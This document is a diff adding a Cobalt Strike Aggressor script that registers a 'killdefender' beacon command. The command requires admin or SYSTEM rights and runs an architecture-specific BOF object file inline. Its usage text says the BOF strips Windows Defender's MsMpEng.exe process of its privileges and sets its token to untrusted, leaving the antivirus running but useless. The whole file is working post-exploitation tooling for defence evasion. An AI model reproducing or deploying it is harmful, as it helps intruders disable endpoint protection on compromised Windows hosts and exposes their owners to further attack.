@@ -1,0 +1,50 @@
+beacon_command_register(
+"killdefender", 
+"Check status of or Kill Windows Defender.", 
+"Usage:
+killdefender check - Check MsMpEng.exe's token in order to determine if KillDefender has already been run.
+killdefender kill - Remove privileges and set MsMpEng.exe token to untrusted rendering Defender useless (but still running).");
+
+alias killdefender {
+	local('$barch $handle $data $args');
+	if(size(@_) != 2)
+	{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("killdefender"));
+		return;
+	}
+	if(($2 eq "kill")||($2 eq "check"))
+	{
+		$username = beacon_info($1, "user");
+		if("*" isin $username)
+		{
+			# figure out the arch of this session
+			$barch  = barch($1);
+
+			# read in the right BOF file
+			$handle = openf(script_resource("KillDefender. $+ $barch $+ .o"));
+			$data   = readb($handle, -1);
+			closef($handle);
+
+			# pack our arguments
+			$args   = bof_pack($1, "z", $2);
+
+			# announce what we're doing
+			btask($1, "Running KillDefender BOF");
+			
+			# execute it.
+			beacon_inline_execute($1, $data, "go", $args);
+		}
+		else
+		{
+			berror($1, "You need Admin or System privileges in order to run this command!");
+			exit();
+		}
+	}
+	else
+	{
+		berror($1, "Incorrect usage!");
+		berror($1, beacon_command_detail("killdefender"));
+		return;
+	}
+}
